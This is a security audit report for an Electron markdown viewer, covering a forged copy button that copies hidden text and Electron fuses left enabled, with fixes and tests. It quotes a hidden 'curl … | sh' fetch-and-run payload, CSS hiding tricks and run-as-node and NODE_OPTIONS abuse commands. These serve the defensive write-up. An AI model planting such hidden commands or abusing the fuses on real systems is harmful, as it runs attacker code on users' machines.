# Security Audit Report

Date: 2026-10-13 (full audit, after plan 31's English UI)
Score: 92/100
Project: Electron (main + preload + renderer), Node.js, GitHub Actions, Homebrew cask distribution
Previous: 91/100 (2026-10-12) · 96/100 (2026-09-17, re-audit) · 87/100 (2026-09-17) · 94/100 (2026-08-10) · 96/100 (2026-08-06)
Baseline commit: `77c681c` (last full audit) → `8d0093b` (develop today)

> **Status after the fixes (2026-10-13, develop `1e40b31`):**
> - L1 is closed by PR #53, with PR #55 keeping author images' `width`/`height`.
> - L2 is closed by PR #54. Users get it with the next release.
> - By this report's method the score would be 96. No re-audit has been run. The score board
>   below is the audit as found.

> The 2026-10-12 report is in git history (`git show 5dbc9f7:security-report.md`). Nothing here
> is carried over from it, or from `memory-security.md`, without being re-checked: every row in
> *What's Secure* comes from a command run today.

---

## Scope

MDV is an offline-first desktop markdown viewer with no server, no database, no accounts and no
sessions. Its attack surface is still this: **it renders untrusted `.md` files and resolves the
file paths they name.** Changes since `77c681c`:

| Area | Change since `77c681c` |
|---|---|
| Main process | PR #51: `productName` `MDV`, userData pinned to `appData/mdv`. PR #52: string table `require`d from `renderer/i18n.js`; menu, `role` labels, close dialog and IPC error text go through `t()`; `additionalArguments: --mdv-locale=` |
| Preload | One new member, `api.locale`, parsed from its own argv and allow-listed (`en`, otherwise `ko`). No new channel |
| Renderer | Every UI string moved to `i18n.js` (150 keys); static markup translated by `applyStaticTranslations`; copy-button tooltip moved from CSS `content:` to `data-tooltip` |
| CI | PR #45 pinned every action to a commit SHA (2026-10-12 M1). PR #46 moved the review bot to the Claude GitHub App (`id-token: write`) |
| Release | v1.4.0 shipped 2026-10-12 through the pinned release workflow; the cask moved to `postflight_steps` (plan 29) |
| Dependencies | None. `package-lock.json` changed only its own version field; `package.json` gained `productName` and `electronLanguages` |

Category 22 (AI/LLM) applies because of the review bot. Eight categories remain N/A: Auth, JWT,
Database, Docker, Protocols, DNS/Email, Mobile, Serverless.

The skill's two "AI blind spot" checks were looked at on purpose, not skipped. **Rate limiting:**
there is no public endpoint. The only network call is the outbound update check, already bounded
(10 s timeout, 1 MB body cap, once per 24 h). **Session fixation:** there are no sessions, logins
or privilege levels. `session.json` stores open tabs, not credentials.

---

## Critical Issues

None.

## High Issues

None.

## Medium Issues

None. The 2026-10-12 medium (M1, actions pinned to movable tags) is **closed**. All four
workflows use commit SHAs. The tag `v1.4.0` itself carries
`softprops/action-gh-release@efb35369… # v3.0.3`, so the release that shipped ran the pinned
action.

## Low Issues

### L1 — a document can forge MDV's code-copy button and copy text the reader cannot see

**What happens.** Raw HTML in a `.md` file can rebuild the exact markup MDV uses for a code block:
a `.code-wrapper` with a `<button class="copy-btn" data-command="copyCode"
data-command-element="true">`. Everything involved survives sanitization. `#content`'s click
handler (`app-shell.js:359-366`) runs **any** `data-command` it finds there, and `copyCode`
(`app-runtime.js:416-419`) copies the nearest `<code>`'s `innerText`. `innerText` includes text
that is rendered but invisible. So the reader sees `npm install left-pad`, presses the familiar
copy button, and gets `npm install left-pad; curl -s https://… | sh`.

**Measured today.**
- DOMPurify keeps the forged wrapper, the button with both `data-command*` attributes, and
  `style="font-size:0"` on a span. This was run in jsdom through the real `markdown.js` render
  path with the real DOMPurify.
- Electron 44.7.0's `innerText` includes the hidden span's text for `font-size:0` (span width
  0 px), `opacity:0`, `color:transparent` and an offscreen span. The control, `display:none`, is
  excluded, so the probe tells the cases apart. This ran in a `show: false` window.
- Read from code, not run: the dispatch path and `copyCode`. A click in the running app was not
  run, because the full app opens windows.

**Why only Low.**
- Selecting the text and pressing ⌘C already copies the hidden part. The forged button only adds
  a one-click copy that looks like MDV's own.
- Shells with bracketed paste (macOS's default zsh, 5.1+; bash 5.1+) show the whole pasted line
  before it runs.

It has been in the code since 2026-06 (`bindContentCommandHandler` in `ca2a2f9`, `copyCode`'s
`innerText` in `04c698e`) and is in every release. **Newly found, not a regression.**

The same handler lets document HTML trigger any other renderer command on click, such as
`closeCurrentTab`, `saveFile`, `openFolder` or `exportPdf`. None of them does more than the
toolbar button of the same name, and the ones that matter still ask (dialogs, the unsaved-changes
prompt). `commands[name]` is an object-literal lookup, so `data-command="constructor"` reaches
`Object`. That was checked: it is harmless (`Object(x)` or a caught `TypeError`). The fix below
closes it anyway.

**Status: closed by PR #53 (merged `1cf04de`; Ian approved 2026-10-13), in two
parts: forged buttons are dead, and author HTML can no longer style itself (residual, below).**
- Each window's markdown controller makes a random 128-bit token.
- The renderer's own copy button carries it as `data-mdv-trust`. So do the empty state's open
  buttons, marked by `markTrustedContentCommands`:
  - by `showEmptyState`, when it writes them;
  - by `bindContentCommandHandler`, for index.html's static copy at boot, before any document can
    be rendered.
- A click in `#content` runs a command only if `findContentCommandTrigger` finds that token on the
  nearest command element. A forged button, and any other `data-command` a document writes, does
  nothing. That also covers the prototype-key lookup.
- The token is an attribute rather than a `WeakSet` of elements because tab snapshots re-create
  `#content` from HTML.
- The document cannot carry the token:
  - it is never shown or exported;
  - it changes with every window;
  - no document script runs.

Tests:
- Unit tests: a forged button with a guessed token is untrusted and another window's controller
  rejects a genuine one (`markdown.test.js`), and the click helper ignores unmarked, plain and
  outside elements (`app-shell.test.js`).
- Two Electron tests:
  - with `copyCode`'s restore timer held, clicking the forged and then the genuine button leaves
    exactly one copy and the clipboard holds only the visible text;
  - the empty state's open button works at boot and after the last tab closes. Nothing tested
    that before.
- Each unit guard was broken on purpose once and its test failed.

**Residual, measured after the fix.** A document can still hide part of a *genuine* block.
- It wraps the fence in its own `<div style="max-height:…;overflow:hidden">`, then a blank line,
  the fence, another blank line and `</div>`. The blank lines end the HTML block, so the fence
  renders as a real, trusted block inside the clipped div (jsdom, real `markdown.js`).
- In a hidden Electron 44.7.0 window, a 22 px box shows only the first line of a two-line block,
  yet `innerText`, and so the genuine button's copy, holds both lines. An unclipped control
  gives the same text at its full 40 px.
- `<style>` elements do not survive DOMPurify, so stylesheets are not a route. Inline `style`
  and MDV's own classes are.

**Residual closed (Ian chose the strict option, 2026-10-13).** Author-written elements now lose
`style` and `class` in `renderMarkdown`, through a DOMPurify `uponSanitizeAttribute` hook.

**Correction, the same day.** The option was presented as "what GitHub's sanitizer does". That was
not measured, and it is not what GitHub does. Measured afterwards:
- GitHub's repository file view kept this repo's README icon at `width: 30%` and dropped
  `display`, `margin`, `padding` and `border`.
- GitHub's `/markdown` API (comments and issues) dropped every inline style.

Ian then chose to keep an author image's `width` and `height`. That is the
`authorImageSizeStyle` exception: only a bare length passes, with no `calc()`, `url()` or
`!important`, and only on `<img>`. It does not reopen the residual, because an image holds no
text to hide. Only `width` was observed on GitHub; `height` was not.

Markdown syntax never produces either attribute: table alignment
is `align`, and marked was checked on tables, task lists, quotes, links and images. So only raw
HTML renders differently, and README/README.ko say so under Known Limitations.

The renderer's own markup keeps both attributes:
- an element carrying this window's token (an alert's outer box);
- everything inside a sealed block the renderer fills alone (`.code-wrapper`, `.mdv-latex`,
  `pre.mermaid`, `.markdown-alert-title`), when the block carries the token.

An alert body, raw HTML inside it included, is still author HTML. The frontmatter card has no
author markup (values are escaped) and is sanitized separately, so it is untouched.

Tests:
- Unit tests: a clipping wrapper loses `style`/`class` while the genuine block inside keeps its
  own; a forged `.mdv-latex` with a guessed token and a forged trust attribute both lose them;
  KaTeX inline styles, alert classes and the mermaid placeholder survive; author HTML inside an
  alert body is still stripped.
- An Electron test: the clipping wrapper renders at least as tall as its code.
- Breaking the hook failed all three unit tests. Removing the alert title's token failed two.
- Accepting a sealed block by class alone failed **no** test. DOMPurify sanitizes ancestors
  before descendants, so a forged block's class is already gone when its contents are checked.
  The token check on sealed blocks is a second layer that today's ordering makes unobservable.

What is left cannot clip part of a genuine block:
- `hidden` and a closed `<details>` hide a whole subtree, and `innerText` leaves out text that is
  not rendered;
- `align`, `width` and `height` do not clip.

Also left: bidi control characters in a fence's own text can display it in reordered form. The
characters stay visible, and GitHub warns about this case. Info, not addressed here.

Proposed step 3 (copy the fence source instead of `innerText`) was dropped. It would not stop the
residual either, because the hidden line is in the fence itself.

**Fix as originally proposed.** A CSS fix cannot work: MDV's own `.visually-hidden` class
survives DOMPurify, so text can be hidden without any inline style. The fix belongs on the
command side:
1. Content clicks honor only `copyCode`; every other `data-command` inside `#content` is ignored.
   This also closes the prototype-key lookup.
2. Genuine copy buttons carry a per-render random marker that the document cannot predict.
   `renderer.code` emits it and the click handler checks it. A forged button has no valid marker.
3. `copyCode` copies the fence source captured at render time, not `innerText`. A fence's own
   text cannot carry styles, so what is copied is what the reader saw.

It changes copy-button behaviour, so it needs Ian's approval (Level 4). A unit test should forge
the button and assert that nothing is copied; an Electron test should assert that a genuine block
still copies.

### L2 — the packaged app keeps Electron's default fuses, so it can be run as plain Node

`npx @electron/fuses read --app /Applications/MDV.app` (v1.4.0) and the local
`dist/mac-arm64/MDV.app` both show:

| Fuse | State |
|---|---|
| `RunAsNode` | **Enabled** |
| `EnableNodeOptionsEnvironmentVariable` | **Enabled** |
| `EnableNodeCliInspectArguments` | **Enabled** |
| `EnableEmbeddedAsarIntegrityValidation` | Disabled |
| `OnlyLoadAppFromAsar` | Disabled |
| `GrantFileProtocolExtraPrivileges` | Enabled |
| `EnableCookieEncryption`, `LoadBrowserProcessSpecificV8Snapshot` | Disabled |
| a ninth fuse the installed `@electron/fuses` cannot name | Enabled |

**Measured.** `ELECTRON_RUN_AS_NODE=1 /Applications/MDV.app/Contents/MacOS/MDV -e '…'` printed
`{"electron":"44.7.0","node":"24.21.0","typeofRequire":"function"}`. The shipped binary runs any
script as plain Node, with no window and no prompt.

**Why it matters, and why only Low.** This gives nothing to someone without code execution. Code
that already runs as the user can borrow MDV's identity, though. On macOS, file-access permissions
(Documents, Desktop, Downloads, network volumes, Full Disk Access) are granted per app. A process
started as MDV gets **whatever grants MDV holds, if the user granted any**. This audit did not
check which grants MDV holds. `NODE_OPTIONS=--require …` and `--inspect` are the same door. This
is a known pattern for Electron apps, and Electron's own security checklist asks apps to switch
off fuses they don't use. No earlier audit looked at fuses.

**Status: fixed by PR #54 (merged `678ebd7`; Ian approved 2026-10-13). It takes effect
for users with the next release.**
- `build.electronFuses` turns off `runAsNode`, `enableNodeOptionsEnvironmentVariable` and
  `enableNodeCliInspectArguments`.
- `resetAdHocDarwinSignature: true` re-signs the bundle ad hoc. The build skips code signing, so
  without it nothing would re-sign the binary after the flip.

Verified on a local `--dir` build:
- the three fuses read Disabled;
- `codesign --verify --deep --strict` passes (identifier `com.ian.mdv`, sealed resources);
- launched hidden through `open -g -j`, the app came up with main, GPU, network and renderer
  processes;
- with `ELECTRON_RUN_AS_NODE=1`, `NODE_OPTIONS=--require <marker>` and `--inspect=39229` all
  set, no script ran and no inspector port opened.

Ian then installed a build of the same branch with `npm run install:local`
(2026-10-13 10:51) and used it. The installed app reads the three fuses as Disabled.

`tests/unit/packaging.test.js` pins the config, and it was seen failing without it.
`RELEASING.md`/`.ko.md` add a post-release fuse check, because the release build is the first
place CI runs the flip and the re-sign.

**Fix as originally proposed.** In `package.json` `build`, add `electronFuses` with `runAsNode`,
`enableNodeOptionsEnvironmentVariable` and `enableNodeCliInspectArguments` set to `false`.
Electron-builder 26 supports this. Leave the rest alone:
- `grantFileProtocolExtraPrivileges` stays on: the UI loads over `file://`, so turning it off needs
  its own test pass.
- Asar integrity adds little while only an ad-hoc signature protects `Info.plist`.

Two things to verify when applying it:
- Flipping fuses rewrites the binary, and arm64 kills a binary whose signature no longer matches.
  The ad-hoc signature must be redone (electron-builder's `resetAdHocDarwinSignature`), and a
  clean `brew install` of the result must launch.
- Playwright `_electron.launch({ executablePath })` against a packaged build needs the inspect
  arguments. Checks like plan 31 §8's packaged-build probes would stop working. The test suite
  itself runs the unpackaged Electron from `node_modules` and is unaffected.

Needs Ian's approval (Level 4).

---

## Info / Accepted

### Remaining `npm audit` output: 10 nodes, 2 advisories, neither reachable

The output is unchanged from 2026-10-12: `low: 2, moderate: 8`, `high: 0`, `critical: 0`.
`--omit=dev` reports only the 2 lows.
- **sprintf-js GHSA-hp3w-g68c-fv3c**: build-only, at the end of
  `electron-builder › … › global-agent › roarr`. npm's only fix is `--force` to an older
  electron-builder.
- **KaTeX GHSA-238p-pmpm-9mq7 (low)**: the 0.16.47 copy bundled inside `mermaid.min.js`. Mermaid
  never sets `trust`. MDV's own KaTeX is 0.18.9.

Electron 44.7.0 is the newest 44.x on npm (44.6.0 2026-10-06, 44.7.0 2026-10-07).

### `MDV_*` environment variables are read by the shipped app

`MDV_USER_DATA_DIR`, `MDV_LOCALE`, `MDV_REPO_OWNER`/`MDV_REPO_NAME` (the update-check repository)
and three `MDV_TEST_*` switches are read in `main.js`. Setting them requires control of the user's
launch environment, which already means code execution as the user. Each value is either
allow-listed (`MDV_LOCALE` → `ko`/`en`) or only redirects MDV's own files or its notify-only update
check. L2 is the stronger version of the same precondition. Recorded so a later audit doesn't
rediscover them.

### The AI review bot reads attacker-influenced text

Unchanged containment, re-read today:
- The job's `if` admits only same-repo, non-draft PRs.
- `allowedTools` is `Read`/`Grep`/`Glob`, three `gh pr` subcommands and inline comments.
- `contents: read`.
- The prompt interpolates only `github.repository` and the PR number.

New since 2026-10-12: `id-token: write`, which the action trades for a Claude GitHub App token
scoped to this repo. It posts as `claude[bot]`.

### Carried from 2026-09-17, unchanged

- `'unsafe-inline'` in `style-src`. This is style only; `script-src` is a bare `'self'`.
  Dropping it would **not** fix L1 (see above).
- The app is unsigned and un-notarized. Download integrity rests on the cask `sha256`. Today the
  chain matches: GitHub's asset digest, `SHA256SUMS` and the cask are all `00889bfc…b223`.
- The bundled font binaries rest on one HTTPS fetch from fonts.gstatic.com.
- npm warns that `electron-winstaller`'s install script is not covered by `allowScripts`. It is
  Windows-only, and the only build here is macOS.

---

## What's Secure

Every row was checked today against `8d0093b` (develop) or the shipped v1.4.0.

| Area | Evidence (command or file read today) |
|---|---|
| **Electron isolation** | `main.js:228-230`: `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` |
| **Renderer containment** | `setWindowOpenHandler` (`:242`) hands only `^https?://` to the OS browser and always denies; `will-navigate` (`:251`) blocks leaving the shell; `open-external-url` (`:555`) applies the same scheme check |
| **CSP** | `index.html:7`: `default-src`/`script-src`/`font-src` bare `'self'`, `img-src 'self' data:`, `form-action`/`base-uri`/`object-src 'none'`; **0** `https?://` references in `index.html` |
| **IPC surface** | 21 `ipcMain` handlers, the same set as before; preload exposes the matching channels plus `api.locale` (allow-listed). The locale is chosen in main by `resolveLocale` (`/^ko(?:$|[-_])/i`), so neither `MDV_LOCALE` nor the OS locale passes a raw value |
| **Translation sinks** | Every `t()` call that takes an argument (14 sites: file names, error text, counts, version) lands in `textContent`, `alert`/`confirm`, or a native menu or dialog label. The `innerHTML` sinks went from 38 to 38 in the renderer modules (3 replaced one for one), plus `applyStaticTranslations`'s `data-i18n-html`; all of them take fixed table strings with no arguments. Translated values in attributes go through `escapeHtml` (`markdown.js` copy button and frontmatter, `app-runtime.js` empty state). Key lookup uses `Object.hasOwn` (unit-tested against `__proto__`/`constructor`) |
| **XSS** | Rendered markdown still goes through `sanitizeHtml` (DOMPurify) before insertion (`markdown.js:401-428`), and so does the frontmatter card (`:828`); plan 31 did not touch the sanitize path |
| **Injection** | No `eval`, `new Function` or `child_process` in `src/`; the two `RegExp(...).exec` calls are a fixed alert pattern and one built from marked's numeric heading depth |
| **Local paths** | `open-local-path` checks the extension of both the link name and its `realpath` (`:589-590`, `:619-624`) before `shell.openPath(realPath)` (`:641`); `read-image-data-url` reads through the resolved path after the same two-sided check |
| **Renderer DoS** | Frontmatter render budget unit tests pass (part of today's 285/285); watcher `error` listeners at `main.js:904` and `:965` |
| **Trojan Source** | No bidi controls, zero-width characters or soft hyphens in 111 tracked code and config files. The scanner was run once against a planted U+202E to confirm it reports one |
| **Dependencies** | `npm audit`: 0 critical, 0 high; 446 lockfile entries, all from `registry.npmjs.org`, none missing `integrity`; no dependency changed since the last audit |
| **Cooldown** | `.npmrc` `min-release-age=3`; `npm config get` returns `3` |
| **Secrets** | `git log 77c681c..HEAD -p` adds nothing secret-shaped; no `.env`/`.pem`/`.key`/`.p12` in the tree; the three Actions secrets are referenced only through `secrets.*` |
| **CI tokens and pinning** | Every `uses:` is a commit SHA; `ci.yml`/`ci-electron.yml` `contents: read`, `release.yml` `contents: write`, review job scoped per job; no `pull_request_target` or `workflow_run`; no `${{ }}` inside any `run:` block (parsed with js-yaml) |
| **Release chain** | v1.4.0's release run succeeded on the pinned action; the asset digest, `SHA256SUMS` and the tap's cask `sha256` agree; the cask's `postflight_steps` runs only `/usr/bin/xattr -dr com.apple.quarantine {{appdir}}/MDV.app` |
| **Tests** | `npm run test:unit` 285/285, `npm run test:controller` 13/13 today |

---

## Score Board

```
╔════════════════════════════════════════════════════════╗
║          SECURITY SCORE : 92/100  🟢                    ║
╠════════════════════════════════════════════════════════╣
║  🟢 Secrets & Files            100/100   (8%)   =      ║
║  🟢 Network & Egress           100/100   (5%)   =      ║
║  🟢 HTTP Headers / CSP          90/100   (5%)   =      ║
║  🟢 Cryptography / Signing      90/100   (6%)   =      ║
║  🟢 Deployment & CI            100/100   (5%)  +20     ║
║  🟢 Advanced Attacks           100/100   (7%)   =      ║
║  🟢 Injections                 100/100   (6%)   =      ║
║  🟢 Race Conditions             95/100   (4%)   =      ║
║  🟢 File Handling              100/100   (3%)   =      ║
║  🟢 Supply Chain                95/100   (5%)   =      ║
║  🟢 Compliance / Privacy       100/100   (4%)   =      ║
║  🟡 Monitoring                  80/100   (3%)   =      ║
║  🟢 Source Code Analysis        95/100   (7%)   -5     ║
║  🟢 Resource Limits            100/100   (3%)   =      ║
║  🟢 AI/LLM (CI review bot)     100/100   (3%)   =      ║
║  🟢 Browser APIs               100/100   (2%)   =      ║
║  🟠 Advanced Security (L3)      55/100   (2%)   -5     ║
╠════════════════════════════════════════════════════════╣
║  N/A: Auth · JWT · Database · Docker · Protocols ·     ║
║       DNS/Email · Mobile · Serverless                  ║
╚════════════════════════════════════════════════════════╝
  📈 91/100 (2026-10-12, 1 day ago) → 92/100
  🔴 0 critical · 🟠 0 high · 🟡 0 medium · 🔵 2 low
```

**Arithmetic.** The method starts from 96. The 4 missing points are structural: L3 signing,
Monitoring, `'unsafe-inline'` and font provenance. Each finding's penalty is then subtracted.
- M1 is closed, so its −5 is gone.
- L1 and L2 are Low, −2 each.
- 96 − 2 − 2 = **92**.

Info items cost nothing.

L1 counts under Source Code Analysis as UI misrepresentation (CWE-451). L2 counts under Advanced
Security (L3), as anti-tamper and runtime hardening.

---

## Next Steps

1. ~~**L1**~~ closed. Content commands need the per-window trust marker, and author HTML loses
   `style` and `class`.
2. ~~**L2 (fuses)**~~ fixed (see L2's status). What is left is checking it on the release: after
   the next `brew upgrade`, read the fuses and launch the app, as RELEASING.md step 7 now says.
3. Afterwards, as before:
   - code signing and notarization, if distribution widens;
   - Trusted Types, together with dropping `'unsafe-inline'`;
   - rebuilding the font subsets from the JetBrains upstream release;
   - revisiting the nested KaTeX with mermaid 12.
